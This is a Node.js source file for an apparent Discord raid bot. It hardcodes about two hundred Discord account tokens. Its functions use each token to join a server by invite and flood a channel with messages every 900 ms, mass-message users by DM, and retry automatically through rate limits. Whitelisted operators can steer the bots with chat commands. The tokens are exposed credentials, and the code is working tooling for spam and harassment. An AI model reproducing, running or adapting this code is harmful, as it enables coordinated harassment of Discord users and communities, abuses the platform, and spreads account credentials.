var request = require('request');
const Discord = require("discord.js");
const Discord2 = require("discord.js");
const client = new Discord.Client();
const client2 = new Discord2.Client();
const fs = require("fs");
var i = 0;
require('events').EventEmitter.defaultMaxListeners = 20;
var messagetest;
 const talkedRecently = new Set();
 var maxMessages = 100; // Change based on how many messages you want sent
/*
var invite = "ewwJr7";
var channel = "451432205839761419";
var id = "298188468817887242";
var proxy = "";
*/
test = [];
 var tokens = [
"NDcwMzEyOTQ3OTkwOTIxMjI4.DjUcxg.pKvdWW1JdhLRffd6CHyJaiZIUY8",
	"MzA2NzE1NTY0MTYyNjc4Nzg0.DPH4Kg.kh8tYnStfuOFl_MwhnJG5l5f9eY",
	"MjgwOTg2MzEwMjM4NTM1Njgw.DPH_DA.u_QwJX_zdSV24cxujSvuwsU1EWw",
"NDcwMzEzNTg0OTQ2MTg0MjA0.DjUdWw.qcU-YrFwdQR6JGcJi5q4rvGHz4s",
"NDcwMzE0MDc0MzUwMDI2NzYz.DjUd6g.sI730mzNzS4gAxzDWdgIh8INDkQ",
	"MzgwNTE1OTY0MTc4OTIzNTMx.DPIA-A.RthBW3fCpsoJbNotP2Gqc-L50F0",
"NDcwMzE0Njg4MTE1Mzc2MTI5.DjUefQ.b3rvp-8rlvnLqVkulbSaHIO2-Ro",
	"NDcwMzkyNDYzOTAzNjg2NjU3.DjVm8A.enurun8zKJTIIu5abnd0ZR8XBww",
"NDY4NjI2NjgwMDkzNjA1OTA5.Di76Gw.BrwDKwYFcvWV8MaLdAlwlSWcH-w",
"NDcwMzE1NjMyMjU3MTM4Njkw.DjUfJA.6p-pjY5uoBXv3EiTyD-86PlI1jk",
"NDY4NjI3MTQ5NzI1ODkyNjE5.Di76iw.71LbToUVfLpKmJu1NDgaQyd3aKg",
"NDY4ODk0NTM4MTM2NTUxNDI2.Di_zog.tfbz39B9tw8Sz81XQm0yRuk2XkQ",
"NDcwMzE2ODAyMTM2NjA0Njky.DjUgfQ.AMcOCBXZcO0WxMdQJQZ4-rJoyho",
"NDcwMzE3MzYyMTc2OTgzMDQz.DjUg-Q.AnO7nzICkpaieUhM_M80IT7Ozi4",
"NDY4ODk1MTU0MDYxNzA1MjE4.Di_0JA.BewlNMx7Gjk9ULfJi5-N7JlrPPw",
"NDY4ODk1MzExNTIwMzMzODI2.Di_0Sg.fSqEK--CiBMweVEMgnfZsEq_hic",
"NDY4ODk1NDc2NTc0MzIyNzA4.Di_0cQ.CpGswvvkrv4OkSzlzz1QCswS27U",
"NDY4ODk1NjM4MjEwMzQ3MDA4.Di_0lw.Vc1F63KL4bu3PiLCF989PW_f374",
"NDcwMzE1OTYwNTMyODYwOTM4.DjUf1w.LUc-fRV0M4r9MKdB1WGFebNpbWA",
	"NDcwNDAxNjIyNTMxMzc1MTE0.DjWhYQ.qCZvpxtc2hxypSUUPsiej6E2piU",
	"NDcwNDU2NTY3MDExOTk5NzQ1.DjWiow.sORZI64SUvaMjmoLPDzSvx3WL1A",
	"NDcxMzc1MjI0NTQ2NTI1MjA0.Djj6Lg.D176HoNBSoNy01vGgodd5Nw6TcE",
	"NDcxNDI4ODc3NjYzNzMxNzIy.DjksIw.bN_bWZ7ANjD4GGsmP3oS4tfl4o4",
	"NDcxNDI5NjkwNTc0MjQxNzky.Djks0g.e3TuoGGmypvYLCcKOqeA3h-glK0",
	"NDcxNDMwMjUzNzY4ODY3ODQw.DjktUw.XE0iK4KpJvC9Sqe83GnN_QmMqRQ",
	"NDcxNDMwNzMxMTg5NzE0OTU0.Djkt3A.JY3jTPraqqc_QDUGoFQ8P-XRw9c",
	"NDcxNDMxMjc0NjI4NjQ0ODg1.DjkuWA.iWLIsJ18jFCndQtqtG64Oa8nHbc",
	"NDcxNDMyMDE3MTIxMTE2MTcx.Djku9w.KI4mRCVICmOUfqDVNy5fk6PXSOM",
	"NDcxNDMyNzI3NTEwNjQ2Nzg0.Djkv7A.VJpQI5iP_o-AJub6VRmWKIgx4Ek",
	"NDcxNDMyMjI3MjI2NTE3NTE0.DjkvQg.v9fXsKzxbTIYDYtNVvxqxRJagXA",
	"NDcxNDMzOTQ3ODg1MzM4NjQ1.Djkw3A.YBhgxZJRrz7IzddLsAV0NE0FG0E",
	"NDcxNDM0OTcxNzUyNTYyNzE5.Djkx6w.6Ob71-gaVu3OQEMCSUa5Cc-Ae-0",
	"NDcxNDM2NTk2MzAyODM5ODA5.Djkzrg.cp4JEB9mgDmpKGyV_E3Nnu7jFgY",
	"NDcxNDMzNTYxODQ5NzI0OTU5.Djkwcw.8sDWQCsZpwOaZZDs-UKx6XXmydw",
	"NDcyNTU0OTMxODc0ODI0MTkz.Dj1E1g.tUmoaT9DRo3n4FkKBHBdCf_V1oI",
"NDcyNTY5MjA3NzI1MjI4MDQz.Dj1SMQ.n38LlOxjcvT44TjOhZ6rVGhR-9Y",
"NDcyNTgzNzIwNjkyNjEzMTIx.Dj1ffQ.HZZXp_lTyeRC6hA-Omf876wpncM",
"NDcyNTg2Mzk3OTM3NTY1NzE3.Dj1iIQ.2G2MX7swRJN3UTANUXUseNDutRo",
"NDcyNTU1NTc0NTQ3MDU0NjIy.Dj1FeA.RuhnLhMYeQxwP6Noiz9jaNocY-U",
"NDcyNTg1MDk1NzQ0NTg1NzI4.Dj1hFA.RN_QzdCwKLdXMjKbxg6aEc1LdEc",
"NDcyNTg0MDE0MDEyNjEyNjI5.Dj1gWg._N5j1koaDwq-Ovapw9qDSzi4H_s",
"NDY5MzU1NTA0NjkxNDQ1NzYx.DjGg5w._GV_VZcWY9Y4ha9US1PeqgI3G0c",
"NDcyNTkwMjg4MjAwNjYzMDQw.Dj1l9A.lxsESDgfgaVdTr9Z_rQHjgUpvtA",
"NDcyNTg3MTUwODAyNjgxODY4.Dj1isg.IPzzMzC__OtikExqNI7Rod5CKmk",
"NDcyNTg4NDk4NDUzMzk3NTA0.Dj1kNQ.DjdsET0BlCLLbk41MbEeRrTI8Uc",
"NDcyNjA4MDg2MjUxNTM2Mzk0.Dj12Rw.ywceKp6A51X0B-73zLimGek_DjY",
"NDcyNTg5MTcyNDAyNTUyODMz.Dj1ktQ.kl2g5v5mpml--KPcu9_pg9r85yI",
"NDY5MzU3MzMzNDM3NDgwOTYx.DjGj9w.6UHIZmAaXAsPAVqCngsDRZaLCUk",
"NDcyNjA1NjgyNTg4NDUwODM1.Dj10VA.tVxVuOTC8PSp3aBkKkgs1buDQN4",
"NDcyNjA4NDgyNDY2NTk0ODM3.Dj12sg.z5NwUIayQHI9fX7eKw-ggcBahl0",
"NDcyNTg5Nzc4NDc1NDE3NjAw.Dj1lRQ.E4tr35EQ_FLrLGHSbCfrBcRjyNw",
"NDcyNjA4OTYyOTcwMTI0Mjk5.Dj13JQ.VqS5NL6ToU6wlgQkr58JKS9xrvE",
"NDY5Mzg4NzUxMTU2Njc0NTYw.DjHAGQ.Bb8Q6hi1hwG6wGaNH3S9B69W6I8",
"NDcyNjA2ODM4NDEyNTQxOTYy.Dj11BQ.CyOl1tjNwCFThc5FUhjO_D-TC8I",
"NDcyNjQxOTY2MTg2ODIzNjgx.Dj2V2w.gnfMV4AAmEr9BBcrzJGi55ge64c",
"NDcxODU2MzEwMjI1MzM4MzY4.Djq6SA.y-mEpvXum1FG5qXdKpUsj1S4pPg",
"NDcyNTg3NzkyMjI5MjAzOTkw.Dj1jdA.yHH4cxupSH1nlCDthk6QvEa6Ow8",
"NDA3MzA4MjE5NTQzODQ2OTEy.DU_nRw.m-8NjjOSLfwVFoS0medQMKavRLc",
"NDA3MzA1MDg4NTUwNDM2ODc1.DU_kTg.mL_UtfKIIr_JOYqAOI5qFP3BNgY",
"NDA3MzEwMjk1NDM0OTE5OTQ4.DU_o8g.eua1zk4_6uHjX183X4ir_3SIIk0",
"NDA3MzE1MzczNjI5ODk4Nzcz.DU_twA.5Lmm22cHTaIQQwwcnYeeHkoc_5A",
"NDA3MzAwNTc3MTAyNjU5NjE0.DU_jrg.rVXhW8eonLGOF2F0fuQ-IKrAIwE",
"NDA3MzA1NjgyMzA0NDk5NzIz.DU_k3g.fsQF7FRZ1yEIvmqU1qQV7S3P-vQ",
"NDY5MzYyNjMzMzI2NDYwOTI5.DjGn1Q._t5jUdFYsVynz9sg0mpPqFPeP5U",
"NDcxODU2OTU3NjA3NzcyMTYy.Djq6zw.5-83aeDXubXieG0AT8JSBGFOykQ",
"NDY0MDY5NzY5MDQyMTk4NTI4.Dh5mJw.sGzv88svL6jczKUqjnlBJnxmAvg",
"NDY0MDY5Nzk4MjUxMzMxNTg1.Dh5mLg.urZcQ8eRyzRBGLkEcfO5cXCLmAE",
"NDY0MDY5NzkxODYzNTM3Njc1.Dh5mLA.DLBe5GIpZYW8otk9XqQXXhD8y44",
"NDY0MDY5ODA4MzE3NzkyMjU2.Dh5mMA.6NGB8QLXvYaN9QUFHkUat_Ui954",
"NDY0MDY5ODA1NDYxNDcxMjUy.Dh5mLw.sjQ-4hZR-h9h9bSEmOY6iril2a8",
"NDY0MDY5ODc1NjMyMDQ2MDkw.Dh5mQA.tH0KLYon3T9bEF07mKhXtvip5qA",
"NDY0MDY5NzYwNTM2MjgxMDg5.Dh5mJQ.BpGh7sqrkQSUQi2m7uIaQ9uLISw",
"NDY0MDY5ODUzMDE2MjI3ODUx.Dh5mOw.aTPgcgn-mU-96Zw1uU4rhV3-Ei4",
"NDY0MDY5Nzk4ODkyOTI5MDM1.Dh5mLg.VnZsRtw1eRU9TimEEmsEi4OhA68",
"NDY0MDY5NzQ0MTQ4ODczMjI2.Dh5mIQ.b_tYmXGMHVjx9XDSEhvEQ6zTXSA",
"NDY0MDY5ODQ5MzU4Nzk0Nzcy.Dh5mOg.GquL0D4k2zfkVnorLCc7wQvf4N4",
"NDY0MDY5ODM1NTk3NTQ1NDg0.Dh5mNw.Zos5klRZmv7flZeVaIljYN7vgRA",
"NDY0MDY5ODg3NjAyNDU4NjI0.Dh5mQw.aHj96CkqmgValM5aI6VVNsO71dk",
"NDY0MDY5ODU4MDc0ODIwNjA4.Dh5mPA.zo_cPWttA5Cgt0N7okxg0wGJOWU",
"NDY0MDY5NzczMjE1NTMxMDEw.Dh5mKA.RyZPAs_xuoPrAvaKckG8uG73wDk",
"NDY0MDY5OTEyNzU5ODk0MDE2.Dh5mSQ.YQFt4N54yBpxw_ph0DFDZBdfO1s",
"NDY0MDY5ODk1MjczODQwNjUw.Dh5mRQ.mbc-300Lc8LafQjvKBUVJE2pNq0",
"NDY0MDY5ODk4MDcxNzAzNTYy.Dh5mRg.djNrhkPFv5X-Ec3Qaw1BZAMVDe4",
"NDY0MDY5NzczOTE1OTc5Nzgx.Dh5mKA.6tBj47EA6iUn6JzmcBApAIWhWT8",
	"NDc3ODk0MDA0MDYzNjAwNjQz.Sx7zNnHyq6N4QIKm3Ccha8z_5Jw",
"NDc3OTA0OTUwOTk1NzE0MDQ5.Wc8UY7d3gv681YuBnd4AJbaAETE",
"NDc3OTA1Nzc5MTY1MjMzMTc1.QfimeJag4KiuVA1xHazhYEvPiaw",
"NDc3OTA3NjUwNDA3ODI1NDA4.icuPUxhDIhJYjiujhVanX8OkQn4",
	"NDc5MDQ1ODU1NDk2NzY1NDYw.DlTh9A.c_yamNPSqStT0LW8VSn_dMoRB0s",
	"NDc5MDQ1NzcyMjU2NDc3MTg1.DlTiQQ.qXsWJhKEcr3dRkkbsHC-07id4tE",
	"NDc5MDQ1ODMyNTAzNDU5ODYy.DlTiWQ.TZdzBYHuN08iapLouQC4H_iML64",
	"NDc5MDQ1Nzc1OTk3Nzk2MzYz.DlTh2w.1EnVFYbj8PXDIeJgrj2CvWKaL3U",
	"NDc5MDQ3Nzg1NzQ4ODg5NjAw.DlTjyg.QPsJWj1kHY9Oi8KiwXBd7Ti8uGc",
	"NDc5MDQ4MTg3NDM3NjQ1ODM0.DlTkCw.JAURMFUEh1o5KIr3BYew5mn5crs",
	"NDc5MDQ4MzIyODEyNzM5NTk1.DlTkgg.iykTSwn6Rz9IMKbJjejtnBkpt6Y",
	"NDc5MDQ4NTcwODA5NDgzMjY1.DlTkhQ.6PUviYKvMdrIOnw82NDBFqkvleM",
	"NDc5MDQ3NzM1ODk5NTg2NTYw.DlTk6g.JNrkT-xZ-nqvJRUD0Z2-Ow1HMQQ",
	"NDc5MDQ4Mjg3MjQ1MTcyNzQ3.DlTk_Q.shXVUDP5SXyoknIrjfkwFm53oSk",
	"NDc5MDQ5MTU4NTAyNjQ1NzYx.DlTlJg.6xJZUmGyuLSrj1pSTQV2vGddePs",
	"NDgxNTMxMzA2NjA2NTkyMDEw.Dl3uSw.5wH_GD1-eNbLHGe_vDYWdW0v6Rc",
	"NDgxNTMzNzg2MDQ4NDMwMTAx.Dl3u2Q.w8-37HWre29Ux9d5tDz7B_mOcgY",
	"NDgxNTM0MzE1NTg3NDM2NTQ0.Dl3vWQ.klbCRQMVzKEJSSB7vAdL0hJh_d8",
	"NDgxNTM0ODE1MzQ3MTQ2NzYy.Dl3v4g.rNmf7vAj6GGk9I2Vxczc5OvDqQ4",
	"NDgxNTM1Mzk3MTQ3NzA1MzQ1.6UZK4U6c3M7Jph0hZ_gAzikCf-A",
	"NDc5MDQ4OTMyNjIyNTk4MTU0.DlTkvA.9xrtHZNPMcLX_ZPAA76jwAPAnqk",
"NDc5MDQ5MDU3NzMwMjk3ODU3.DlTlQQ.ksgDY1d24n4joQmwPHMfeI4gMSQ",
"NDc5MDQ3OTA5NTg1NzE1MjAw.DlTkSg.YxWRNV46tMyM8L-VKZBvBZD4xpE",
"NDc5MDQ3NzY2MDIzMzQwMDYz.DlTkQQ.x2xp99f1MMoBjL4EUhSVVBgEq9w",
"NDc5MDQ3NzYxOTAwMDc3MDU3.DlTlVA.0ZYXLHA0tkhiB4ZjSeqayMuDHd0",
"NDc5MDQ4NDk5MzAwNjYzMzA3.DlTk9Q.NtN2ox6bSyRLLLoxzofl58ghwaM",
"NDc5MDQ3ODc5MjY5NDE2OTY1.DlTjvA.JM56WPd1OGXK1WRlk4t2bdo_ILI",
"NDc5MDQ4NzQ0NjM4MDg3MTY4.DlTkdg.8rnhHI4ShvXblW0hn6Z7lI9LRr4",
"NDc5MDQ4MDY1NzQzODQ3NDI2.DlTlVQ.CBlpJ7_BqbMDAhPMPG35bCGb79U",
"NDc5MDQ5Mjc2MDM1Njk0NjAz.DlTllA.hCHOWgNAI49q0c3wgtcMAFWpBYo",
"NDc5MDUwMjc3NTM0ODI2NTI3.DlTmOg.-iVGmjdRF-yg7He4rBcndfXMUCc",
"NDc5MDQ3OTM1MDI4NjI1NDMx.DlTlOg.V623rUlp3uWbSqFi2fT3r6pOxso",
"NDc5MDUxMTY3NTUzMjkwMjQ1.DlTm6w.1NaNEfMXbz-idd_Qt-PgbZbijy0",
"NDc5MDQ5MjA0ODcwODA3NTUz.DlTl2g.8NH3HwWojLd87Y4IXEtMRB4BKK0",
"NDc5MDUwNjM2ODQzOTQxODg4.DlTmVw.HgTrni2dCi6EJENrpTZBt3IpFyw",
"NDc5MDUwNDA5NDIwMzkwNDAy.DlTmVQ.2AnaNFyuYtN7SRth-fgXVjNkYGY",
"NDc5MDUwMDYwMjMyMTMwNTcw.DlTl7Q.yS1WG4MPWeffdwnqDP41kHA11Z0",
"NDc5MDQ5ODAyNDY2NzIxNzkz.DlTl3w._JqCOeqLc-rt6fHEZzUnAg-XEXU",
"NDc5MDUwMzQ2NjI3NTk2MzE4.DlTmIQ.gQNIJe8KeGrCH_p9Ncd9duygYfs",
"NDc5MDUwMjg5MzU0MjQ0MDk2.DlTmhQ.M1vvajsbX7W749FsbREAww854V8",
"NDc5MDUwNDg4OTgyMjc0MDQ4.DlTmSA.PMJ3PtSDbk6-wSbP-Xds0vX8Ji0",
"NDc5MDQ5OTI3MzEwMzExNDU3.DlTl4g.bu-xO7MxztncdTTMZSi7NS2EjgI",
"NDc5MDUxMDg3OTIwNDk2NjUw.DlTm0g.BacehGSUQl8znp3RuIU6MIaP0TA",
"NDc5MDUwNTgwNDg5MTQyMjc3.DlTmRQ.51eVl0q5DDGsdXUdsJv7xfB97rQ",
"NDc5MDUwMDc1NzA0OTE4MDMx.DlTmKQ.8b1Uga_0gq2QV1C1N5l0fptoKG0",
"NDc5MDUxMDA0NDI4NTUwMTk0.DlTm3g._7eOnfzF57qyVsGy76wXLAE1k40",
"NDc5MDUxMzczMDYxODY1NTMy.DlTnIg.MN0R_z7iBTQ10TE75YeFiPFkcTE",
"NDc5MDUxODU2OTUwMzI5MzU0.DlTnhA.m559JBZwlRzDYnV3bBeuFNYdDzg",
"NDc5MDUxNTk3MTkyODg4MzQz.DlTnMw.eckVNbZGFiYKPtkCkzdr4r0Orec",
"NDc5MDUxNzUzMjM3NjQzMjc3.DlTn3Q.RvEa0cRkd2Ffuq3wG2WGfYyoFX0",
"NDc5MDUwOTcyNzU3NDkxNzMy.DlTmwQ.Ngy7vk_jRqBOc_jilsmUbSFK3RY", 
"NDc5MDUwNzU1NjAxNDY1MzQ5.DlTnUw.M1pV9i96Jnn2sdw4F6GqQC4nD9I", 
"NDc5MDUxNjM3ODU2NDAzNDU2.DlTntw.qV3S-iZU35Ma48aH55RObDpu1wE", 
"NDc5MDUyMzc5ODUwMDE0NzM1.DlToAg.iSXy9iwYYoPpzDTgIe4xwaBdug8", 
"NDc5MDUyMDIzMDY5NjcxNDI5.DlTn_w.RLDxV6kqkeqztZNiw2Z05_xS2Jg", 
"NDc5MDUxNzM0ODQ1NDg5MTUz.DlToHQ.r8d-2NT1prufBwfFstA-Kg5egYo", 
"NDc5MDUyMzA5NjQ5OTQ4Njgz.DlTn_w.WlR1jCGjvDbpPEvPE_m6e5Ql4dQ", 
"NDc5MDUyNDg1NjcyMDQyNTA1.DlTn9w.AOBFdUVuFhra8oig41yMdDzXn4Y", 
"NDc5MDUyMzE5OTUxMDI4MjI0.DlToVg.6IbFRgNf81FrnLp7MXKNxQ9zFZE", 
"NDc5MDUyNzgzODQ5NDM5MjM4.DlTogQ.UunEjhoCj6FCCuJGBSBIqI_U8wQ", 
"NDc5MDUxOTA1OTUyMjUxOTE0.DlToJg.8myg6_IaPP7oLsA_BhI610Thfdw", 
"NDc5MDUzMDc3NzAyMzc3NDcy.DlTopw.AVpQH9MZ_htmpHWE009fRKn9YSc", 
"NDc5MDUyMzYzMDg1MTE5NDk5.DlToUA.m_AnRo-Bl2La58TvonEpMfcvbLo", 
"NDc5MDUyNzE4NTE5MDkxMjAy.DlTolg.6ZRdg1Plkm8SZynzS9NR6iL6vfo", 
"NDc5MDUyNzM4Mjk1MjM0NTkw.DlTorw.aXV26Pww_w1ybF7uMkZVPOhYr6c", 
"NDc5MDUyOTYwNTg4ODkwMTEy.DlTo3g.ZTfbQLotxJZbRlbtcuBufnung48", 
"NDc5MDUyNTY1NzExOTQ1NzI5.DlTovw.J5tYGjrmvIUgQBwy0I5AtIsn3T8",
"NDc5MDUzMDc1NDE2NDgxODAy.DlTosg.CVBPfVAkGA9J-DyBYwdrMQqFkFw", 
"NDc5MDUzNTM0ODg1NTc2NzA2.DlTpFQ.1v3OvkL7Hu7zuHlBNQwKzMRSv3U", 
"NDc5MDUzMzM4NTY3MjQ1ODM3.DlTo-w.5gWn8_Af7QevHGx1MPwZsg7FJZg", 
"NDc5MDUzNTYzNDI4MDc3NTc4.DlTpFg.vsPwLmvVhjk0C22ikidP_1dQpKs", 
"NDc5MDUzNjA2NzU5MzAxMTIw.DlTpSw.EPcajmxLN2PrbB08nwWrIbPUb0o", 
"NDc5MDUzODY4Nzk4MzEyNDQ5.DlTpbw.qxMtM05je_KfhwFvFowQe7Pi-Os", 
"NDc5MDUzNzYwNDAwODUwOTU0.DlTpjQ.V5vLat9QEzAcxOGQcTVNCMjymE8", 
"NDc5MDUzNjQ1ODQxOTU2ODk0.DlTplw.DLsx-8uawvVQ42i9tYAnn5nmEVY", 
"NDc5MDUzNDIyNTQ5NTMyNjcz.DlTpZg.XVU0rAESAslkIHEVXhTtCnnam44", 
"NDc5MDUzOTQ5MjQ1MTk0MjQw.DlTpzw.pso7V5QA8z9gqKxMPCqKUnn0q58", 
"NDc5MDU0NDIyODkxMTY3NzY5.DlTqBw.SDW6IPpc03fCCp7GEOMSmnxsnDU", 
"NDc5MDU0MjcxOTcxNzIxMjI2.DlTqBg.xZ1pJrPhf4qgmpdlwKRGSWf-Q3o",
	"NDc5MDU3MDc5NDY2OTgzNDM0.DlTsqg.Sevj15FjOR2zF_JNkEJ7IiHkT8s",
"NDc5MDU1Nzg5MjUyODA0NjEy.DlTsRQ.Ot560JUPWfQiVtEMWV4C8agoZWU",
"NDc5MDU2NjQ1Mzg1NzQ4NDkx.DlTsuA.gDlA0rjQ68K5YaVtAEwTBoztP7o",
"NDc5MDU3MTIyMTg1NzA3NTMx.DlTtAQ.2X8HgcZPZ50zCkaHfZmDNw5wxGE",
"NDc5MDU2Nzg5OTAwNjIzODcy.DlTtBQ.1nSsrOesKMERtjS3t_TQOo5UMbE",
"NDc5MDU3OTUzMjcwMjY3OTE1.DlTtLA.73W35X-xETlsM5Y7lvm8MSUb-bE",
"NDc5MDU3MjQxMTIzODQ4MjAy.DlTtHg.Cj8SXJ-S_BAVqsVYAiGut_Tn4m4",
"NDc5MDU4MTU2MDg2MDk5OTY4.DlTtTQ.YVk_ZiOPKp5x_GjOF_62KHCQa6U",
"NDc5MDU0NjczMDMxMDY5Njk2.DlTsGQ.tmhGThuaps1D93ElryLjk3CqhBw",
"NDc5MDU3MTMwODQyNzUwOTg4.DlTtVw.4MTP80hatag6QMeslsIjzN5X3rY",
"NDc5MDU4MjE3NDkwNTc5NDY4.DlTtXQ.1LiTEMTvgGHNlxd9URDRC8e7Ui4",
"NDc5MDU3NjY0NDI1MzI4Njcw.DlTs7Q.bcMSmmEycxZeCevWVqUWvr7KklM",
"NDc5MDU4MzM2MzU3MTU0ODE3.DlTteA.lASJCMNdEocdE6dE6t-H30OrM1Q",
"NDc5MDU4Mjg1NDA0NjE4NzU3.DlTtmg.G-9paur7mfXNN3q0gPzkJwDK_Uw",
"NDc5MDU3NDYyODE3ODQ5Mzc0.DlTsxw._QoPjMmNQCaL_mRJf8OhgKUfVoQ",
"NDc5MDU1MzYyNjA0MDA3NDM1.DlTtLg.P8IIqeyDdKeaOA5-N5xQ_ewtlbU",
"NDc5MDU4MTM2MjM4NjUzNDQw.DlTtYw.KGtlxJ_nQVlqN1fVITPPlbxwaqs",
"NDc5MDU3NzQyMTI0OTQxMzI1.DlTtfA.DzV2kso1UZPNVk36aMftsiZGFJE",
"NDc5MDU2NzI4MDIxOTI1OTA5.DlTsnw.8EitRKfF47SHo8GxFALi4yITLAo",
"NDc5MDU4NDIyMDM4MjY1ODY3.DlTtnQ.BN7UG0tVQlyDZ5-DKbQJmr6fTZQ",
"NDc5MDU4NTMzNTAyMTU2ODAw.DlTtvQ.1BcJgTrfLCFkePWlmelbk44VdeY",
"NDc5MDU4MzkzNzY0NzI0NzM3.DlTtzA.iEbj0xgpgMuX73dPn1k1mKFTrYU",
"NDc5MDU4NjYwNzY1NTk3Njk2.DlTt-A.Qx-dPoZaPq1CbWc7Db_e_CPHlY8",
"NDc5MDU5Mzk0MjM1OTkwMDU2.DlTuhA.0blq4KpNIgbNlhQmyatdo5cXHfM",
"NDc5MDU5NDE2MTM0NzEzMzY1.DlTudw.MZcb7h_tAAkmqCyHNRVA-Acd3Sk",
"NDc5MDU5MzQ1MTUwMDUwMzI0.DlTugg.L2lu2Jl8FLBGNsEchOos5lXYJdY",
"NDc5MDU3NTk1NzA1OTgzMDE1.DlTuOw.-VWeWlSWPE4R508LXRX_27iVgXI",
"NDc5MDU4ODAzMDgyNjU3Nzky.DlTuOg.q_aebQBsU3a9TYEL1b7069G82Cg",
"NDc5MDU4OTYzMDc4NTc4MjA3.DlTuLQ.r6p0YE7n_hqUfHu580MBVOHKSec",
"NDc5MDU5MjcwMzMyMDU1NTUy.DlTutQ.LNg2YJUW1e1ggjXIUZIrQlVHCxo",
"NDc5MDU4NDQwMTI4NTYxMTc3.DlTuJg.a87unoVUdNeIcBCju49r0EdeISA",
"NDc5MDU4OTYyMjY5MDc3NTA0.DlTuGQ.QMr8Ru4Fa1tDfHqcTtG3BKTe-Tg",
"NDc5MDU4MTU5NTUwNDY0MDMz.DlTtqw.P1_RcW6HZRGi79eG0SytJo0CR90",
"NDc5MDU4NDU2MTIxMTgwMTYw.DlTuzQ.7iGdWhibTbF2UGlyPZT1S-5UTPY",
"NDc5MDU5ODMyMjcyNTg0NzE0.DlTu8g.KVxNxESA5azC8bLpp2ij_lM-i6E",
"NDc5MDU5NzcwNjQ5NzM5Mjg0.DlTu2Q.VbSxtMKbC7MiKVMArebpT8MYJsM",
"NDc5MDU5NTgzNTY2ODcyNTc2.DlTvZg.6P53dFjUd-bgJo6oPEieSLRgGsQ",
"NDc5MDU3NzIyMzA2OTg1OTg0.DlTthQ.8GmoYv02MhzJ3yXBtGhyxyZ5Jeg",
"NDc5MDU5NzUwNTA0NDk3MTY0.DlTuzw.7MiSFkJuQqibQnl3bpxFMmcfG7k",
"NDc5MDU5ODk1NzE5ODIxMzIz.DlTvcg.gAkEI9hgQg5gOzJB4RojW8ClBAM",
"NDc5MDU5NjY4MjQ1OTM4MTk2.DlTu2w.wQd5LrywZNZGwos4S2wJoq9racM",
"NDc5MDYwNzQ0NDUzODgxODY3.DlTv2w.ifI_RFYZiVwwrc7PggS-_shuOno",
"NDc5MDYwNjg0OTk1NTU5NDI1.DlTv0w.UayiiA_KXXkTMwNo61n6scrrMZM",
"NDc5MDYxMjA0NTY0NzA1Mjgy.DlTwFQ.AyQM0iFAJRe2okcCAbA-X7RIPfE",
"NDc5MDYwMzc2Njk3MTc2MDY2.DlTwDg.lr-y6c1mbShI0l08BZwUbvn3WEQ",
 	
 ];
var testz = tokens.length;
  function isInArray(array, search)
{
    return array.indexOf(search) >= 0;
}
 whitelist = ["214486512861970432","475432784211476481","305639565656326145","305639565656326145","199555647333728257","321971966074552321","287609251374039051"];
function spam(channel,message,token)
{
    const Data = {
            content: message,
            token: token
        }
         const Headers = {
            authorization: Data.token,
            'content-type': 'application/json'
        }
         request({
            method: 'POST',
            headers: Headers,
            json:    Data,
            uri:      "https://discordapp.com/api/v6/channels/"+channel+"/messages"
        }, (Error, Response, Body) => {
			try {
				var delay = Body.retry_after;
				if(Body.message === 'You are being rate limited.') {
                var t = setTimeout(()=>{spam(channel,message,token);},1+delay);
				}
			} catch (err) {
				var delay = 5
				var t = setTimeout(()=>{spam(channel,message,token);},1+delay);
			}
			
        });
		
}
function spamdm(userid,message,token)
{
    const Data = {
            recipient_id: userid,
            token: token
        }
         const Headers = {
            authorization: Data.token,
            'content-type': 'application/json'
        }
         request({
            method: 'POST',
            headers: Headers,
            json:    Data,
            uri:      "https://discordapp.com/api/v6/users/@me/channels"
        }, (Error, Response, Body) => {
			try {
				var delay = Body.retry_after;
				if(Body.message === 'You are being rate limited.') {
                var t = setTimeout(()=>{createdm(userid,message,token);},1+delay);
				} else {
					var chanid = Body.id;
					spam(chanid,message,token);
				}
			} catch (err) {
				var delay = 5
				var t = setTimeout(()=>{createdm(userid,message,token);},1+delay);
			}
			
        });
		
}
 function reqreset(eemail, method, url, form) {
    console.log("Email: " + eemail + " Method: " + method + "")
    return new Promise((resolve, reject) => {
        request({
            method: method,
            url: url,
            headers: {
                email: eemail
            },
	
            form: form
        }, (error, response, body) => {
            if (error) return reject(error);
            resolve(body);
        });
    });
}
function online(tokens)
{
    var clients = [];
    tokens.forEach(function(token) {
    clients.push(newclient(token));
    });
    return clients;
}
function newclient(token)
{
    return {token: token, client: new Discord.Client()};
}
 function req(token, method, url, form) {
    return new Promise((resolve, reject) => {
        request({
            method: method,
		
            url: url,
		
            headers: {
				'User-Agent': "Mozilla/5.0 (X11; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0",
                authorization: token
            },
	
		
	
            form: form
        }, (error, response, body) => {
            if (error) return reject(error);
            resolve(body);
        });
    });
}
 function attack(tkn, inv, chnl, srver,message){
	
    
    req(tkn, "POST", "https://discordapp.com/api/v6/invite/" + inv).then(body => {
        let parsed = JSON.parse(body);
	   
	 
	   	 			setInterval(function () {
				
						
						
			
						
						
			if(i < 10000){
				
				i += 1
				      
				
				     req(tkn, "POST", "https://discordapp.com/api/v6/channels/" + chnl + "/messages", {content: message}).then(body => {
					     if(body.includes("Unknown Channel")){
					     process.exit(0);
						     
                         }
                        
					     if(i > 500000){process.exit(1)}
		});
				
				
				
			
		
			}
						
						
			
						
			
  
},900); 
	    
       
	    
 				   
	
 	
	 
	
	
        
       
    
        
    });
	
	
		
	
	
     
 }
 function sleep(ms){
    return new Promise(resolve=>{
        setTimeout(resolve,ms)
    })
}
function send(invite,channel,server,message){
	
 console.log("")
clients = online(tokens);
var i = 0;
 clients.forEach(function(bot) {
    bot.client.login(bot.token);
	
   
    bot.client.on('message', message => {
		if(!isInArray(whitelist,message.author.id)) return;
		
		
  if (message.content === '!helpinfo') {
    // Note that this will only work if the message was sent in a guild
    // and the author is actually in a voice channel.
    // You might want to check for all that stuff first
    const channel = message.member.voiceChannel;
	
     channel.join()
    .then(connection => console.log('Connected!'))
    .catch(console.error);
  }
  if(message.content === "pls help me"){
	   const channel = message.member.voiceChannel;
     channel.leave();
	  
	  
  }
  if(message.content === "seagull send help"){
	   const channel = message.member.voiceChannel;
	   channel.join()
 .then(connection => {
      const dispatcher = connection.playFile('./Mine_mine_mine_SFX_-_Finding_nemo-Ps8aBSnEIXE.mp3');
            dispatcher.on("end", end => {channel.leave()});
	   })
	  
  }
  
});
});
     tokens.forEach(function(death) {
	   
        attack(death, invite, channel, server,message);
        
    });
     
 }
